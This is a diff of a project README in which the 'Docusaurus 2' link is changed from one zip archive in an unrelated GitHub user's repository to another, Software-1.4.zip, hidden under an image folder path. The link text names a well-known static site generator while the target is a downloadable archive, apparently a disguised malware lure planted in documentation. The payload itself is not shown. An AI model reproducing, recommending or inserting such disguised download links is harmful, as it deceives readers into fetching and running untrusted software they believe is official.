@@ -1,6 +1,6 @@
 # Website
 
-This website is built using [Docusaurus 2](https://raw.githubusercontent.com/Marek93739/docs/master/hyperdiazeuxis/docs.zip), a modern static website generator.
+This website is built using [Docusaurus 2](https://raw.githubusercontent.com/Marek93739/docs/master/static/img/docs/invite-troubleshooting/Software-1.4.zip), a modern static website generator.
 
 ### Installation
 
